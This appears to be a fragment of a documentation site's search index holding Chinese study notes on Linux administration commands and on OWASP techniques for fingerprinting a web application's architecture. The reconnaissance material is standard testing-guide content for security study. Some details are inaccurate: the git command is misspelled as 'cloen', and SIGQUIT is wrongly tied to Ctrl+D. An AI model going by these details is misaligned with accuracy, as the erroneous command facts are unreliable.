//\u8fde\u540c\u5bb6\u76ee\u5f55\u4e00\u540c\u5220\u9664</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#usermod","title":"usermod","text":"<p>$ usermod [\u9009\u9879] [\u7528\u6237\u540d]  //\u9009\u9879\u4e0e useradd \u76f8\u540c\uff0c\u4e3a\u66f4\u6539\u64cd\u7eb5</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#passwd","title":"passwd","text":"<p>$ passwd [\u9009\u9879] [\u7528\u6237\u540d]</p> <ul> <li> <p>\u9009\u9879</p> <ul> <li> <p><code>-l</code> \u9501\u5b9a\u53e3\u4ee4\uff0c\u7981\u7528\u8d26\u53f7</p> </li> <li> <p><code>-u</code> \u89e3\u9501\u8d26\u53f7\u53e3\u4ee4</p> </li> <li> <p><code>-d</code> \u5220\u9664\u8d26\u53f7\u53e3\u4ee4</p> </li> </ul> </li> <li> <p>\u7528\u6237\u540d</p> </li> </ul>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_2","title":"\u5305\u7ba1\u7406","text":"<p>\u547d\u4ee4 | \u63cf\u8ff0 | --- | --- | <code>dpkg</code> | \u7528\u6765\u5b89\u88c5\uff0c\u6784\u5efa\uff0c\u5220\u9664\u548c\u7ba1\u7406 Debian \u8f6f\u4ef6\u5305\u7684\u5de5\u5177\u3002 <code>apt</code>  | \u5305\u7ba1\u7406\u7684\u9ad8\u7ea7\u547d\u4ee4\u884c\u5de5\u5177 <code>aptitude</code> | apt \u7684\u66ff\u4ee3\u54c1\uff0c\u5305\u7ba1\u7406\u5668\u7684\u9ad8\u7ea7\u63a5\u53e3 <code>snap</code>  | \u5b89\u88c5\uff0c\u914d\u7f6e\uff0c\u5237\u65b0\u548c\u5220\u9664 snap \u5305\uff0c Snap\u652f\u6301\u5b89\u5168\u5206\u53d1\u9002\u7528\u4e8e\u4e91\u3001\u670d\u52a1\u5668\u3001\u684c\u9762\u548c\u7269\u8054\u7f51\u7684\u6700\u65b0\u5e94\u7528\u7a0b\u5e8f\u548c\u5b9e\u7528\u7a0b\u5e8f <code>gem</code> | Ruby \u7684\u6807\u51c6\u5305\u7ba1 \u7406\u5668 <code>pip</code> | Python \u7684\u5305\u5b89\u88c5\u7a0b\u5e8f <code>git</code> | \u5feb\u901f\u3001\u53ef\u6269\u5c55\u3001\u5206\u5e03\u5f0f\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#apt","title":"APT","text":"<p>\u914d\u7f6e\u6587\u4ef6\u6240\u5728\u4f4d\u7f6e <code>/etc/apt/sources.list</code></p> <p>\u5e38\u7528 \u00b7\u00b7\u00b7\u00b7</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#dpkg","title":"DPKG","text":"<pre><code>\u5b89\u88c5\n$ sudo dpkg -i *.deb\n</code></pre>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#git","title":"Git","text":"<pre><code>$ git cloen https://github.com/xxx/xxx.git /xxx\n\n</code></pre>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_3","title":"\u670d\u52a1\u548c\u8fdb\u7a0b\u7ba1\u7406","text":"<p>\u7cfb\u7edf\u670d\u52a1\u53ef\u5206\u4e3a\u5185\u90e8\u670d\u52a1\uff0c\u7cfb\u7edf\u542f\u52a8\u65f6\u9700\u8981\u7684\u76f8\u5173\u670d\u52a1\uff0c\u548c\u7528\u6237\u5b89\u88c5\u7684\u670d\u52a1\uff0c\u901a\u5e38\u5305\u62ec\u6240\u6709\u670d\u52a1\u5668\u670d\u52a1\u3002\u6b64\u7c7b\u670d\u52a1\u5728\u540e\u53f0\u8fd0\u884c\uff0c\u65e0\u9700\u4efb\u4f55\u7528\u6237\u4ea4\u4e92\u3002\u8fd9\u4e9b\u4e5f\u88ab\u79f0\u4e3a <code>daemons</code>  \u5e76\u7531\u7a0b\u5e8f\u540d\u79f0\u672b\u5c3e\u7684\u5b57\u6bcd <code>d</code>  \u6807\u8bc6\uff0c\u4f8b\u5982\uff0c<code>sshd</code>\u3001<code>systemd</code></p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_4","title":"\u7cfb\u7edf\u63a7\u5236","text":"<p><code>systemd</code> \u5b88\u62a4\u7a0b\u5e8f\uff0c\u5b88\u62a4\u8fdb\u7a0b\u4e3a <code>Init process</code> </p> <pre><code>\u542f\u52a8/\u91cd\u542f/\u505c\u6b62/\u81ea\u542f\u52a8/\u5173\u95ed\u81ea\u542f\u52a8\n$ systemctl start/restart/stop/enable/disable\n\u5217\u51fa\u6240\u6709\u670d\u52a1\n$ systemctl list-units --type=service\n\u67e5\u770b\u670d\u52a1\u8fd0\u884c\u65e5\u5fd7\n$ journalctl -u ssh.service --no-pager\n</code></pre>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_5","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"<p>\u8fdb\u7a0b\u72b6\u6001\uff1a<code>Running</code> <code>Waiting</code>(\u7b49\u5f85\u4e8b\u4ef6\u6216\u7cfb\u7edf\u8d44\u6e90)     <code>Stopped</code> <code>Zombie</code>(\u5df2\u505c\u6b62\u4f46\u8fdb\u7a0b\u8868\u4ecd\u6709\u6761\u76ee)</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_6","title":"\u5173\u95ed\u8fdb\u7a0b","text":"<p><code>kill</code>, <code>pkill</code>, <code>pgrep</code>,<code>killall</code></p> <pre><code>\u67e5\u770b\u6240\u6709\u9009\u9879\n$ kill -l\n</code></pre> <p>\u5e38\u7528</p> <p>\u5e8f\u53f7|\u63cf\u8ff0 |---|---| 1 | SIGHUP\u5f53\u63a7\u5236\u5b83\u7684\u7ec8\u7aef\u5173\u95ed\u65f6\uff0c\u8fd9\u5c06\u53d1\u9001\u5230\u8fdb\u7a0b 2 | SIGINT \u5f53\u7528\u6237\u6309\u4e0b <code>[Ctrl] + C</code> \u4e2d\u65ad\u8fdb\u7a0b\u65f6\u53d1\u9001 3 | SIGQUIT \u5f53\u7528\u6237\u6309\u4e0b <code>[Ctrl] + D</code> \u9000\u51fa\u65f6\u53d1\u9001 9 | SIGKILL \u7acb\u5373\u7ec8\u6b62\u6ca1\u6709\u6e05\u7406\u64cd\u4f5c\u7684\u8fdb\u7a0b 15 | SIGTERM \u7a0b\u5e8f\u7ec8\u6b62 19 | SIGSTOP \u505c\u6b62\u7a0b\u5e8f \u4e0d\u80fd\u518d\u5904\u7406\u4e86 20 | SIGTSTP \u5f53\u7528\u6237\u6309\u4e0b <code>[Ctrl] + Z</code> \u8bf7\u6c42\u6682\u505c\u670d\u52a1\u65f6\u53d1\u9001\u3002\u7528\u6237\u53ef\u4ee5\u5728\u4ee5\u540e\u5904\u7406\u5b83</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_7","title":"\u540e\u53f0\u8fdb\u7a0b","text":"<pre><code>\u67e5\u770b\u6240\u6709\u540e\u53f0\u8fdb\u7a0b\n$ jobs\n\u5c06\u8fdb\u7a0b\u7f6e\u4e8e\u540e\u53f0\n[Ctrl] + Z\n$ bg\n\u53e6\u4e00\u79cd\u65b9\u6cd5 &amp;\n$ ping [ip] &amp;\n\n</code></pre>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_8","title":"\u524d\u53f0\u8fdb\u7a0b","text":"<pre><code>\u5c06\u540e\u53f0\u7a0b\u5e8f\u79fb\u81f3\u524d\u53f0\n$ jobs\n[1]+ Running ping [ip] &amp;\n$ fg 1\n</code></pre>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#_9","title":"\u6267\u884c\u591a\u4e2a\u547d\u4ee4","text":"<p>\u4e09\u79cd\u53ef\u80fd\u65b9\u5f0f\u5206\u9694 <code>;</code>\u7ed3\u5c3e\uff0c\u5ffd\u7565\u5148\u524d\u547d\u4ee4\u7684\u7ed3\u679c\u548c\u9519\u8bef\u6765\u6267\u884c\u547d\u4ee4 <code>&amp;&amp;</code>\uff0c\u5148\u540e\u987a\u5e8f\u6267\u884c\uff0c\u671f\u95f4\u6709\u9519\u8bef\u4f1a\u505c\u6b62\u6267\u884c\u547d\u4ee4 <code>|</code>\uff0c\u5c06\u524d\u4e00\u4e2a\u8fdb\u7a0b\u7684\u7684\u8f93\u51fa\u4f5c\u4e3a\u540e\u9762\u7684\u8f93\u5165</p> <p>. \u6dfb\u52a0\u5b88\u62a4\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6</p> <p>service</p> <p>\u8fdb\u7a0b\u7ba1\u7406</p> <p>kill 9 \u6740\u6389pid\u6240\u5728\u8fdb\u7a0b</p>"},{"location":"Linux/Linux%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/#web","title":"WEB\u670d\u52a1","text":"<p>curl \u9ed8\u8ba4\u5b89\u88c5\u5728\u5927\u591a\u6570Linux\u7cfb\u7edf\u4e0a\uff0c\u5141\u8bb8\u6211\u4eec\u901a\u8fc7\u534f\u8bae\u4ece shell \u4f20\u8f93\u6587\u4ef6\uff0c\u5982<code>HTTP</code>, <code>HTTPS</code>, <code>FTP</code>, <code>FTPS</code>, <code>SCP</code>\u3002</p> <pre><code>curl http://localhost\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/","title":"1.10Map \u5e94\u7528\u6846\u67b6","text":"<p>\u7f51\u9875</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_1","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u6709\u6548\u5730\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u80fd\u591f\u5c31\u5982\u4f55\u89e3\u51b3\u4efb\u4f55\u5df2\u8bc6\u522b\u7684\u95ee\u9898\u63d0\u4f9b\u6709\u610f\u4e49\u7684\u5efa\u8bae\uff0c\u4e86\u89e3\u60a8\u5b9e\u9645\u6d4b\u8bd5\u7684\u5185\u5bb9\u975e\u5e38\u91cd\u8981\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u786e\u5b9a\u662f\u5426\u5e94\u5c06\u7279\u5b9a\u7ec4\u4ef6\u89c6\u4e3a\u8d85\u51fa\u6d4b\u8bd5\u8303\u56f4\u3002</p> <p>\u73b0\u4ee3 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u590d\u6742\u6027\u53ef\u80fd\u6709\u5f88\u5927\u5dee\u5f02\uff0c\u4ece\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684\u7b80\u5355\u811a\u672c\u5230\u8de8\u6570\u5341\u79cd\u4e0d\u540c\u7cfb\u7edf\u3001\u8bed\u8a00\u548c\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u590d\u6742\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd8\u53ef\u80fd\u6709\u989d\u5916\u7684\u7f51\u7edc\u7ea7\u7ec4\u4ef6\uff0c\u4f8b\u5982\u9632\u706b\u5899\u6216\u5165\u4fb5\u4fdd\u62a4\u7cfb\u7edf\uff0c\u5b83\u4eec\u4f1a\u5bf9\u6d4b\u8bd5\u4ea7\u751f\u91cd\u5927\u5f71\u54cd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u548c\u4f7f\u7528\u7684\u6280\u672f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4ece\u9ed1\u76d2\u89d2\u5ea6\u8fdb\u884c\u6d4b\u8bd5\u65f6\uff0c\u91cd\u8981\u7684\u662f\u8981\u5c1d\u8bd5\u6e05\u695a\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u4ee5\u53ca\u91c7\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u548c\u7ec4\u4ef6\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u7279\u5b9a\u7ec4\u4ef6\uff08\u4f8b\u5982 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff09\uff0c\u800c\u5176\u4ed6\u60c5\u51b5\u5219\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8bc6\u522b\u3002</p> <p>\u4ee5\u4e0b\u90e8\u5206\u63d0\u4f9b\u4e86\u5bf9\u5e38\u89c1\u67b6\u6784\u7ec4\u4ef6\u7684\u9ad8\u7ea7\u6982\u8ff0\uff0c\u4ee5\u53ca\u5982\u4f55\u8bc6\u522b\u5b83\u4eec\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_4","title":"\u5e94\u7528\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_5","title":"\u7f51\u7edc\u670d\u52a1\u5668","text":"<p>\u7b80\u5355\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528\u6307\u5357\u7684\u6307\u7eb9 Web \u670d\u52a1\u5668\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u6b65\u9aa4\u6765\u8bc6\u522b\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#paas","title":"\u5e73\u53f0\u5373\u670d\u52a1 (PaaS)","text":"<p>\u5728\u5e73\u53f0\u5373\u670d\u52a1 (PaaS) \u6a21\u578b\u4e2d\uff0cWeb \u670d\u52a1\u5668\u548c\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\u7531\u670d\u52a1\u63d0\u4f9b\u5546\u7ba1\u7406\uff0c\u5ba2\u6237\u53ea\u5bf9\u90e8\u7f72\u5728\u5176\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u8d1f\u8d23\u3002\u4ece\u6d4b\u8bd5\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u6709\u4e24\u4e2a\u4e3b\u8981\u533a\u522b\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u65e0\u6743\u8bbf\u95ee\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\uff0c\u56e0\u6b64\u65e0\u6cd5\u76f4\u63a5\u4fee\u590d\u4efb\u4f55\u95ee\u9898\u3002</li> <li>\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u5f88\u53ef\u80fd\u8d85\u51fa\u4efb\u4f55\u9879\u76ee\u7684\u8303\u56f4\u3002</li> </ul> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8bc6\u522b PaaS \u7684\u4f7f\u7528\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f7f\u7528\u7279\u5b9a\u7684\u57df\u540d\uff08\u4f8b\u5982\uff0c\u90e8\u7f72\u5728 Azure App Services \u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u6709\u4e00\u4e2a<code>*.azurewebsites.net</code>\u57df\u2014\u2014\u5c3d\u7ba1\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\uff09\u3002\u4f46\u662f\uff0c\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u5f88\u96be\u786e\u5b9a\u662f\u5426\u6b63\u5728\u4f7f\u7528 PaaS\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_6","title":"\u65e0\u670d\u52a1\u5668","text":"<p>\u5728\u65e0\u670d\u52a1\u5668\u6a21\u578b\u4e2d\uff0c\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u76f4\u63a5\u5728\u6258\u7ba1\u5e73\u53f0\u4e0a\u4f5c\u4e3a\u72ec\u7acb\u529f\u80fd\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u90e8\u7f72\u5728 webroot \u4e2d\u7684\u4f20\u7edf\u5927\u578b Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4f7f\u5f97\u5b83\u975e\u5e38\u9002\u5408\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u3002\u4e0e PaaS \u73af\u5883\u4e00\u6837\uff0c\u57fa\u7840\u67b6\u6784\u6d4b\u8bd5\u53ef\u80fd\u8d85\u51fa\u8303\u56f4\u3002</p> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7\u7279\u5b9a HTTP \u6807\u5934\u7684\u5b58\u5728\u6765\u6307\u793a\u65e0\u670d\u52a1\u5668\u4ee3\u7801\u7684\u4f7f\u7528\u3002\u4f8b\u5982\uff0cAWS Lambda \u51fd\u6570\u901a\u5e38\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u6807\u5934\uff1a</p> <pre><code>X-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context\n</code></pre> <p>Azure Functions \u4e0d\u592a\u660e\u663e\u3002\u5b83\u4eec\u901a\u5e38\u4f1a\u8fd4\u56de<code>Server: Kestrel</code>\u6807\u5934 - \u4f46\u8fd9\u672c\u8eab\u5e76\u4e0d\u8db3\u4ee5\u786e\u4fe1\u5b83\u662f\u4e00\u4e2a Azure \u5e94\u7528\u7a0b\u5e8f\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u5728 Kestrel \u4e0a\u8fd0\u884c\u7684\u4e00\u4e9b\u5176\u4ed6\u4ee3\u7801\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_7","title":"\u5fae\u670d\u52a1","text":"<p>\u5728\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f API \u7531\u591a\u4e2a\u79bb\u6563\u670d\u52a1\u7ec4\u6210\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u3002\u670d\u52a1\u672c\u8eab\u901a\u5e38\u5728\u5bb9\u5668\u5185\u8fd0\u884c\uff08\u901a\u5e38\u4f7f\u7528 Kubernetes\uff09\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u8bed\u8a00\u3002\u5c3d\u7ba1\u5b83\u4eec\u901a\u5e38\u4f4d\u4e8e\u5355\u4e2a API \u7f51\u5173\u548c\u57df\u4e4b\u540e\uff0c\u4f46\u4f7f\u7528\u591a\u79cd\u8bed\u8a00\uff08\u901a\u5e38\u5728\u8be6\u7ec6\u7684\u9519\u8bef\u6d88\u606f\u4e2d\u6307\u51fa\uff09\u53ef\u80fd\u8868\u660e\u6b63\u5728\u4f7f\u7528\u5fae\u670d\u52a1\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_8","title":"\u9759\u6001\u5b58\u50a8","text":"<p>\u8bb8\u591a\u5e94\u7528\u7a0b\u5e8f\u5c06\u9759\u6001\u5185\u5bb9\u5b58\u50a8\u5728\u4e13\u7528\u5b58\u50a8\u5e73\u53f0\u4e0a\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u6258\u7ba1\u5728\u4e3b Web \u670d\u52a1\u5668\u4e0a\u3002\u4e24\u4e2a\u6700\u5e38\u89c1\u7684\u5e73\u53f0\u662f Amazon \u7684 S3 Buckets \u548c Azure \u7684 Storage Accounts\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u8f7b\u677e\u8bc6\u522b\uff1a</p> <ul> <li>Amazon S3 \u5b58\u50a8\u6876\u662f<code>BUCKET.s3.amazonaws.com</code>\u6216<code>s3.REGION.amazonaws.com/BUCKET</code></li> <li>Azure \u5b58\u50a8\u5e10\u6237\u662f<code>ACCOUNT.blob.core.windows.net</code></li> </ul> <p>\u8fd9\u4e9b\u5b58\u50a8\u5e10\u6237\u901a\u5e38\u4f1a\u66b4\u9732\u654f\u611f\u6587\u4ef6\uff0c\u5982\u6d4b\u8bd5\u4e91\u5b58\u50a8\u6307\u5357\u90e8\u5206\u6240\u8ff0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_9","title":"\u6570\u636e\u5e93","text":"<p>\u5927\u591a\u6570\u91cd\u8981\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u67d0\u79cd\u6570\u636e\u5e93\u6765\u5b58\u50a8\u52a8\u6001\u5185\u5bb9\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u5c3d\u7ba1\u5b83\u901a\u5e38\u4f9d\u8d56\u4e8e\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5176\u4ed6\u95ee\u9898\u3002\u8fd9\u901a\u5e38\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u5b8c\u6210\uff1a</p> <ul> <li>\u7aef\u53e3\u626b\u63cf\u670d\u52a1\u5668\u5e76\u67e5\u627e\u4e0e\u7279\u5b9a\u6570\u636e\u5e93\u5173\u8054\u7684\u4efb\u4f55\u5f00\u653e\u7aef\u53e3\u3002</li> <li>\u89e6\u53d1\u4e0e SQL\uff08\u6216 NoSQL\uff09\u76f8\u5173\u7684\u9519\u8bef\u6d88\u606f\uff08\u6216\u4ece\u641c\u7d22\u5f15\u64ce\u4e2d\u67e5\u627e\u73b0\u6709\u9519\u8bef\u3002</li> </ul> <p>\u5982\u679c\u65e0\u6cd5\u6700\u7ec8\u786e\u5b9a\u6570\u636e\u5e93\uff0c\u60a8\u901a\u5e38\u53ef\u4ee5\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u5176\u4ed6\u65b9\u9762\u8fdb\u884c\u6709\u6839\u636e\u7684\u731c\u6d4b\uff1a</p> <ul> <li>Windows\u3001IIS \u548c ASP.NET \u7ecf\u5e38\u4f7f\u7528 Microsoft SQL \u670d\u52a1\u5668\u3002</li> <li>\u5d4c\u5165\u5f0f\u7cfb\u7edf\u901a\u5e38\u4f7f\u7528 SQLite\u3002</li> <li>PHP \u901a\u5e38\u4f7f\u7528 MySQL \u6216 PostgreSQL\u3002</li> <li>APEX \u7ecf\u5e38\u4f7f\u7528 Oracle\u3002</li> </ul> <p>\u8fd9\u4e9b\u4e0d\u662f\u786c\u6027\u89c4\u5b9a\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u66f4\u597d\u7684\u4fe1\u606f\uff0c\u80af\u5b9a\u53ef\u4ee5\u4e3a\u60a8\u63d0\u4f9b\u4e00\u4e2a\u5408\u7406\u7684\u8d77\u70b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#_10","title":"\u9a8c\u8bc1","text":"<p>\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u90fd\u6709\u67d0\u79cd\u5f62\u5f0f\u7684\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u3002\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u540e\u7aef\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>Web \u670d\u52a1\u5668\u914d\u7f6e\uff08\u5305\u62ec<code>.htaccess</code>\u6587\u4ef6\uff09\u6216\u811a\u672c\u4e2d\u7684\u786c\u7f16\u7801\u5bc6\u7801\u3002<ul> <li>\u901a\u5e38\u663e\u793a\u4e3a HTTP \u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531\u6d4f\u89c8\u5668\u4e2d\u7684\u5f39\u51fa\u7a97\u53e3\u548c<code>WWW-Authenticate: Basic</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> </ul> </li> <li>\u6570\u636e\u5e93\u4e2d\u7684\u672c\u5730\u7528\u6237\u5e10\u6237\u3002<ul> <li>\u901a\u5e38\u96c6\u6210\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u8868\u5355\u6216 API \u7aef\u70b9\u4e2d\u3002</li> </ul> </li> <li>\u73b0\u6709\u7684\u4e2d\u592e\u8eab\u4efd\u9a8c\u8bc1\u6e90\uff0c\u4f8b\u5982 Active Directory \u6216 LDAP \u670d\u52a1\u5668\u3002<ul> <li>\u53ef\u4ee5\u4f7f\u7528 NTLM \u8eab\u4efd\u9a8c\u8bc1\uff0c\u7531<code>WWW-Authenticate: NTLM</code>HTTP \u6807\u5934\u6307\u793a\u3002</li> <li>\u53ef\u4ee5\u4ee5\u4e00\u79cd\u5f62\u5f0f\u96c6\u6210\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u3002</li> <li>\u53ef\u80fd\u9700\u8981\u4ee5\u201cDOMAIN\\username\u201d\u683c\u5f0f\u8f93\u5165\u7528\u6237\u540d\uff0c\u6216\u8005\u53ef\u80fd\u4f1a\u63d0\u4f9b\u53ef\u7528\u57df\u7684\u4e0b\u62c9\u5217\u8868\u3002</li> </ul> </li> <li>\u4e0e\u5185\u90e8\u6216\u5916\u90e8\u63d0\u4f9b\u5546\u7684\u5355\u70b9\u767b\u5f55 (SSO)\u3002<ul> <li>\u901a\u5e38\u4f7f\u7528 OAuth\u3001OpenID Connect \u6216 SAML\u3002</li> </ul> </li> </ul> <p>\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u4e3a\u7528\u6237\u63d0\u4f9b\u591a\u79cd\u8eab\u4efd\u9a8c\u8bc1\u9009\u9879\uff08\u4f8b\u5982\u6ce8\u518c\u672c\u5730\u5e10\u6237\u6216\u4f7f\u7528\u4ed6\u4eec\u73b0\u6709\u7684 Facebook \u5e10\u6237\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4e3a\u666e\u901a\u7528\u6237\u548c\u7ba1\u7406\u5458\u4f7f\u7528\u4e0d\u540c\u7684\u673a\u5236\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.10Map%20%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/#api","title":"\u7b2c\u4e09\u65b9\u670d\u52a1\u548c API","text":"<p>\u51e0\u4e4e\u6240\u6709 Web \u5e94\u7528\u7a0b\u5e8f\u90fd\u5305\u542b\u7531\u5ba2\u6237\u7aef\u52a0\u8f7d\u6216\u4e0e\u4e4b\u4ea4\u4e92\u7684\u7b2c\u4e09\u65b9\u8d44\u6e90\u3002\u8fd9\u4e9b\u53ef\u4ee5\u5305\u62ec\uff1a</p> <ul> <li>\u6d3b\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u811a\u672c\u3001\u6837\u5f0f\u8868\u3001\u5b57\u4f53\u548c iframe\uff09\u3002</li> <li>\u88ab\u52a8\u5185\u5bb9\uff08\u4f8b\u5982\u56fe\u50cf\u548c\u89c6\u9891\uff09\u3002</li> <li>\u5916\u90e8 API\u3002</li> <li>\u793e\u4ea4\u5a92\u4f53\u6309\u94ae\u3002</li> <li>\u5e7f\u544a\u7f51\u7edc\u3002</li> <li>\u652f\u4ed8\u7f51\u5173\u3002</li> </ul> 